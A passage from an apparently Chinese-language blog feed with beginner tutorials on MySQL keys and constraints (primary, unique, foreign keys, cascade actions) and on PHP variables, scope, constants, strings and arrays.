<h4 id="1-3-3-自动增长（auto-increment）"><a href="#1-3-3-自动增长（auto-increment）" class="headerlink" title="1.3.3  自动增长（auto_increment）"></a>1.3.3  自动增长（auto_increment）</h4><p>字段值从1开始，每次递增1，自动增长的值就不会有重复，适合用来生成唯一的id。在MySQL中只要是自动增长列必须是主键</p>
<h4 id="1-3-4-主键（primary-key）"><a href="#1-3-4-主键（primary-key）" class="headerlink" title="1.3.4  主键（primary key）"></a>1.3.4  主键（primary key）</h4><p>主键概念：唯一标识表中的记录的一个或一组列称为主键。</p>
<p>特点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、不能重复、不能为空</span><br><span class="line">2、一个表只能有一个主键。</span><br></pre></td></tr></table></figure>

<p>作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、保证数据完整性</span><br><span class="line">2、加快查询速度</span><br></pre></td></tr></table></figure>

<p>选择主键的原则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最少性：尽量选择单个键作为主键</span><br><span class="line">稳定性：尽量选择数值更新少的列作为主键</span><br><span class="line"></span><br><span class="line">比如：学号，姓名、地址  这三个字段都不重复，选哪个做主键?</span><br><span class="line">选学号，</span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建主键方法一</span><br><span class="line">mysql&gt; create table stu20(</span><br><span class="line">    -&gt; id int auto_increment primary key,</span><br><span class="line">    -&gt; name varchar(20)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">-- 创建主键方法二</span><br><span class="line">mysql&gt; create table stu21(</span><br><span class="line">    -&gt; id int auto_increment,</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; primary key(id)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br></pre></td></tr></table></figure>

<p>组合键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu22(</span><br><span class="line">    -&gt; classname varchar(20),</span><br><span class="line">    -&gt; stuname varchar(20),</span><br><span class="line">    -&gt; primary key(classname,stuname)  -- 创建组合键</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc stu22;</span><br><span class="line">+-----------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field     | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-----------+-------------+------+-----+---------+-------+</span><br><span class="line">| classname | varchar(20) | NO   | PRI |         |       |</span><br><span class="line">| stuname   | varchar(20) | NO   | PRI |         |       |</span><br><span class="line">+-----------+-------------+------+-----+---------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>通过更改表添加主键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu23(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; name varchar(20)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 添加主键</span><br><span class="line">mysql&gt; alter table stu23 add primary key(id);</span><br><span class="line">Query OK, 0 rows affected (0.09 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<p>删除主键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table stu23 drop primary key;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<p>插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu25(</span><br><span class="line">    -&gt; id tinyint unsigned auto_increment primary key,</span><br><span class="line">    -&gt; name varchar(20)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 插入数据</span><br><span class="line">mysql&gt; insert into stu25 values (3,&#x27;tom&#x27;);   -- 可以直接插入数字</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">-- 自动增长列可以插入null,让列的值自动递增</span><br><span class="line">mysql&gt; insert into stu25 values (null,&#x27;berry&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>小结：</p>
<p>1、只要是auto_increment必须是主键，但是主键不一定是auto_increment</p>
<p>2、主键特点是不能重复不能为空</p>
<p>3、一个表只能有一个主键，但是一个主键可以有多个字段组成</p>
<p>4、自动增长列通过插入null值让其递增</p>
<p>5、自动增长列的数据被删除，默认不再重复使用。truncate table删除数据后，再次插入从1开始</p>
<p>练习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在主键列输入的数值，允许为空吗?		不可以</span><br><span class="line">一个表可以有多个主键吗?				不可以</span><br><span class="line">在一个学校数据库中，如果一个学校内允许重名的学员，但是一个班级内不允许学员重名，可以组合班级和姓名两个字段一起来作为主键吗？						对</span><br><span class="line">标识列（自动增长列）允许为字符数据类型吗？	不允许</span><br><span class="line">一个自动增长列中，插入3行，删除2行，插入3行，删除2行，插入3行，删除2行，再次插入是多少？  10</span><br></pre></td></tr></table></figure>



<h4 id="1-3-5-唯一键（unique）"><a href="#1-3-5-唯一键（unique）" class="headerlink" title="1.3.5  唯一键（unique）"></a>1.3.5  唯一键（unique）</h4><table>
<thead>
<tr>
<th>键</th>
<th>区别</th>
</tr>
</thead>
<tbody><tr>
<td>主键</td>
<td>1、不能重复，不能为空<br />2、一个表只能有一个主键</td>
</tr>
<tr>
<td>唯一键</td>
<td>1、不能重复，可以为空<br />2、一个表可以有多个唯一键</td>
</tr>
</tbody></table>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建表的时候创建唯一键 </span><br><span class="line">mysql&gt; create table stu26(</span><br><span class="line">    -&gt; id int auto_increment primary key,</span><br><span class="line">    -&gt; name varchar(20) unique    -- 唯一键</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">-- 方法二 </span><br><span class="line">mysql&gt; create table stu27(</span><br><span class="line">    -&gt; id int primary key,</span><br><span class="line">    -&gt; name varchar(20),</span><br><span class="line">    -&gt; unique(name)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">多学一招：</span><br><span class="line">unique 或 unique key 是一样的</span><br></pre></td></tr></table></figure>

<p>通过修改表添加唯一键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 将name设为唯一键</span><br><span class="line">mysql&gt; alter table stu28 add unique(name);  </span><br><span class="line"></span><br><span class="line">-- 将name,addr设为唯一键</span><br><span class="line">mysql&gt; alter table stu28 add unique(name),add unique(addr);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; desc stu28;</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| Field | Type        | Null | Key | Default | Extra |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">| id    | int(11)     | NO   | PRI | NULL    |       |</span><br><span class="line">| name  | varchar(20) | YES  | UNI | NULL    |       |</span><br><span class="line">| addr  | varchar(20) | YES  | UNI | NULL    |       |</span><br><span class="line">+-------+-------------+------+-----+---------+-------+</span><br><span class="line">3 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure>



<p>通过show create table 查看唯一键的名字</p>
<p>通过唯一键的名字删除唯一键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; alter table stu28 drop index name;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>



<h4 id="1-3-6-备注（comment）"><a href="#1-3-6-备注（comment）" class="headerlink" title="1.3.6  备注（comment）"></a>1.3.6  备注（comment）</h4><p>说明性文本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table stu29(</span><br><span class="line">    -&gt; id int primary key comment &#x27;学号&#x27;,</span><br><span class="line">    -&gt; name varchar(20) not null comment &#x27;姓名&#x27;</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure>

<p>注意：备注属于SQL代码的一部分</p>
<h2 id="1-4-SQL注释"><a href="#1-4-SQL注释" class="headerlink" title="1.4  SQL注释"></a>1.4  SQL注释</h2><p>单行注释 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 单行注释</span><br><span class="line"># 单行注释</span><br><span class="line">多行注释  /*     */</span><br></pre></td></tr></table></figure>



<h2 id="1-5-数据完整性"><a href="#1-5-数据完整性" class="headerlink" title="1.5  数据完整性"></a>1.5  数据完整性</h2><h4 id="1-5-1-数据完整性包括"><a href="#1-5-1-数据完整性包括" class="headerlink" title="1.5.1  数据完整性包括"></a>1.5.1  数据完整性包括</h4><p>1、实体完整性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、主键约束</span><br><span class="line">2、唯一约束</span><br><span class="line">3、标识列</span><br></pre></td></tr></table></figure>

<p>2、 域完整性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、数据类型约束</span><br><span class="line">2、非空约束</span><br><span class="line">3、默认值约束</span><br></pre></td></tr></table></figure>

<p>3、 引用完整性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">外键约束</span><br></pre></td></tr></table></figure>

<p>4、  自定义完整性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、存储过程</span><br><span class="line">2、触发器</span><br></pre></td></tr></table></figure>



<h4 id="1-5-2-主表和从表"><a href="#1-5-2-主表和从表" class="headerlink" title="1.5.2  主表和从表"></a>1.5.2  主表和从表</h4><ol>
<li>主表中没有的记录，从表不允许插入</li>
<li>从表中有的记录，主表中不允许删除</li>
<li>删除主表前，先删子表</li>
</ol>
<h4 id="1-5-3-外键（foreign-key）"><a href="#1-5-3-外键（foreign-key）" class="headerlink" title="1.5.3  外键（foreign key）"></a>1.5.3  外键（foreign key）</h4><p>外键：从表中的公共字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建表的时候添加外键</span><br><span class="line">drop table if exists stuinfo;</span><br><span class="line">create table stuinfo(</span><br><span class="line">       id tinyint primary key,</span><br><span class="line">       name varchar(20)</span><br><span class="line">)engine=innodb;</span><br><span class="line"></span><br><span class="line">drop table if exists stuscore;</span><br><span class="line">create table stuscore(</span><br><span class="line">       sid tinyint primary key,</span><br><span class="line">       score tinyint unsigned,</span><br><span class="line">       foreign key(sid) references stuinfo(id)   -- 创建外键</span><br><span class="line">)engine=innodb;</span><br><span class="line"></span><br><span class="line">-- 通过修改表的时候添加外键</span><br><span class="line">语法：alter table 从表 add foreign key(公共字段) references 主表(公共字段)</span><br><span class="line"></span><br><span class="line">drop table if exists stuinfo;</span><br><span class="line">create table stuinfo(</span><br><span class="line">       id tinyint primary key,</span><br><span class="line">       name varchar(20)</span><br><span class="line">)engine=innodb;</span><br><span class="line"></span><br><span class="line">drop table if exists stuscore;</span><br><span class="line">create table stuscore(</span><br><span class="line">       sid tinyint primary key,</span><br><span class="line">       score tinyint unsigned</span><br><span class="line">)engine=innodb;</span><br><span class="line"></span><br><span class="line">alter table stuscore add foreign key (sid) references stuinfo(id)</span><br></pre></td></tr></table></figure>



<p>删除外键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过外键的名字删除外键</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 删除外键</span><br><span class="line">mysql&gt; alter table stuscore drop foreign key `stuscore_ibfk_1`;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、只有innodb才能支持外键</span><br><span class="line">2、公共字段的名字可以不一样，但是数据类型要一样</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-三种外键操作"><a href="#1-5-4-三种外键操作" class="headerlink" title="1.5.4  三种外键操作"></a>1.5.4  三种外键操作</h4><p>1、  严格限制（参见主表和从表）</p>
<p>2、  置空操作（set null）：如果主表记录删除，或关联字段更新，则从表外键字段被设置为null。</p>
<p>3、  级联操作（cascade）：如果主表记录删除，则从表记录也被删除。主表更新，从表外键字段也更新。</p>
<p>语法：foreign key (外键字段) references 主表名 (关联字段) [主表记录删除时的动作] [主表记录更新时的动作]。</p>
<p>一般说删除时置空，更新时级联。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table if exists stuinfo;</span><br><span class="line">create table stuinfo(</span><br><span class="line">       id tinyint primary key comment &#x27;学号，主键&#x27;,</span><br><span class="line">       name varchar(20) comment &#x27;姓名&#x27;</span><br><span class="line">)engine=innodb;</span><br><span class="line"></span><br><span class="line">drop table if exists stuscore;</span><br><span class="line">create table stuscore(</span><br><span class="line">       id int auto_increment primary key comment &#x27;主键&#x27;,</span><br><span class="line">       sid tinyint comment &#x27;学号，外键&#x27;,</span><br><span class="line">       score tinyint unsigned comment &#x27;成绩&#x27;,</span><br><span class="line">       foreign key(sid) references stuinfo(id) on delete set null on update cascade</span><br><span class="line">)engine=innodb;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">置空、级联操作中外键不能是从表的主键</span><br></pre></td></tr></table></figure>



<h2 id="1-6-补充"><a href="#1-6-补充" class="headerlink" title="1.6  补充"></a>1.6  补充</h2><p>phpstudy中MySQL默认不是严格模式，将MySQL设置成严格模式</p>
<p>打开my.ini，在sql-mode的值中，添加STRICT_TRANS_TABLES</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql-mode=&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&quot;</span><br></pre></td></tr></table></figure>



<p>单词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">medium：中等的</span><br><span class="line">small:小</span><br><span class="line">tiny:微小</span><br><span class="line">big:大</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>PHP开发基础-变量篇</title>
    <url>/2023/04/20/PHP%20%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-%E5%8F%98%E9%87%8F%E7%AF%87/</url>
    <content><![CDATA[<h1 id="PHP-变量"><a href="#PHP-变量" class="headerlink" title="PHP 变量"></a>PHP 变量</h1><p>与代数类似，可以给 PHP 变量赋予某个值（x&#x3D;5）或者表达式（z&#x3D;x+y）。</p>
<p>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。</p>
<p>PHP 变量规则：</p>
<ul>
<li>变量以 $ 符号开始，后面跟着变量的名称</li>
<li>变量名必须以字母或者下划线字符开始</li>
<li>变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）</li>
<li>变量名不能包含空格</li>
<li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li>
</ul>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">6</span>;</span><br><span class="line"><span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为11</p>
<hr>
<h2 id="创建（声明）PHP-变量"><a href="#创建（声明）PHP-变量" class="headerlink" title="创建（声明）PHP 变量"></a>创建（声明）PHP 变量</h2><p>PHP 没有声明变量的命令。</p>
<p>变量在您第一次赋值给它的时候被创建：</p>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10.5</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为  Hello world!</p>
<hr>
<h2 id="PHP-变量作用域"><a href="#PHP-变量作用域" class="headerlink" title="PHP 变量作用域"></a>PHP 变量作用域</h2><p>变量的作用域是脚本中变量可被引用&#x2F;使用的部分。</p>
<p>PHP 有四种不同的变量作用域：</p>
<ul>
<li>local</li>
<li>global</li>
<li>static</li>
<li>parameter</li>
</ul>
<h3 id="局部和全局作用域"><a href="#局部和全局作用域" class="headerlink" title="局部和全局作用域"></a>局部和全局作用域</h3><p>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p>
<p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问：</p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>; <span class="comment">// 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$y</span>=<span class="number">10</span>; <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;测试函数内变量:&lt;p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;变量 x 为: <span class="subst">$x</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;变量 y 为: <span class="subst">$y</span>&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;测试函数外变量:&lt;p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;变量 x 为: <span class="subst">$x</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;变量 y 为: <span class="subst">$y</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<p>测试函数内变量:</p>
<p>变量 x 为:<br>变量 y 为: 10</p>
<p>测试函数外变量:</p>
<p>变量 x 为: 5<br>变量 y 为:</p>
<hr>
<p>在以上实例中 myTest() 函数定义了 $x 和 $y 变量。 $x 变量在函数外声明，所以它是全局变量 ， $y 变量在函数内声明所以它是局部变量。</p>
<p>当我们调用myTest()函数并输出两个变量的值, 函数将会输出局部变量 $y 的值，但是不能输出 $x 的值，因为 $x 变量在函数外定义，无法在函数内使用，如果要在一个函数中访问一个全局变量，需要使用 global 关键字。</p>
<p>然后我们在myTest()函数外输出两个变量的值，函数将会输出全局变量 $x 的值，但是不能输出 $y 的值，因为 $y 变量在函数中定义，属于局部变量。</p>
<hr>
<h3 id="PHP-global-关键字"><a href="#PHP-global-关键字" class="headerlink" title="PHP global 关键字"></a>PHP global 关键字</h3><p>global 关键字用于函数内访问全局变量。</p>
<p>在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字：</p>
<h3 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出 15</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为15</p>
<hr>
<p>PHP 将所有全局变量存储在一个名为 $GLOBALS[<em>index</em>] 的数组中。 <em>index</em> 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。</p>
<p>上面的实例可以写成这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="Static-作用域"><a href="#Static-作用域" class="headerlink" title="Static 作用域"></a>Static 作用域</h3><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p>
<p>要做到这一点，请在您第一次声明变量时使用 <strong>static</strong> 关键字：</p>
<h3 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="variable">$x</span>++;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;    <span class="comment">// 换行符</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为0 1 2</p>
<p>然后，每次调用该函数时，该变量将会<strong>保留着函数前一次被调用时的值</strong>。</p>
<h3 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h3><p>参数是通过调用代码将值传递给函数的局部变量。</p>
<p>参数是在参数列表中声明的，作为函数声明的一部分：</p>
<h3 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">myTest</span>(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量是一个简单值的标识符。该值在脚本中不能改变。 (常量名不需要加 $ 修饰符)。</p>
<p>注意： 常量在整个脚本中都可以使用。</p>
<p>设置常量，使用 define() 函数，函数语法如下：</p>
<p>define(string constant_name, mixed value, case_sensitive &#x3D; true)<br>该函数有三个参数:</p>
<p>constant_name：必选参数，常量名称，即标志符。</p>
<p>value：必选参数，常量的值。</p>
<p>case_sensitive：可选参数，指定是否大小写敏感，设定为 true 表示不敏感。</p>
<h3 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;GREETING&quot;</span>, <span class="string">&quot;Welcome to runoob.com!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> GREETING;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为 Welcome to runoob.com!</p>
<h1 id="字符串函数和字符串连接"><a href="#字符串函数和字符串连接" class="headerlink" title="字符串函数和字符串连接"></a>字符串函数和字符串连接</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt1</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="variable">$txt2</span>=<span class="string">&quot;What a nice day!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txt1</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$txt2</span>; <span class="comment">// 字符串连接运算符 .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello world!&quot;</span>); <span class="comment">//获取字符串长度</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>); <span class="comment">//获取子串位置</span></span><br><span class="line"><span class="comment">//字符串中第一个字符的位置是 0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果 Hello world! What a nice day!</p>
<p>12</p>
<p>6</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>); <span class="comment">//数组定义 数值数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I like &quot;</span> . <span class="variable">$cars</span>[<span class="number">0</span>] . <span class="string">&quot;, &quot;</span> . <span class="variable">$cars</span>[<span class="number">1</span>] . <span class="string">&quot; and &quot;</span> . <span class="variable">$cars</span>[<span class="number">2</span>] . <span class="string">&quot;.&quot;</span>; <span class="comment">//访问数组元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数组长度count()</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>); <span class="comment">//count() 函数用于返回数组的长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历数值数组</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="variable">$arrlength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);<span class="comment">//定义关联数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Peter is &quot;</span> . <span class="variable">$age</span>[<span class="string">&#x27;Peter&#x27;</span>] . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span 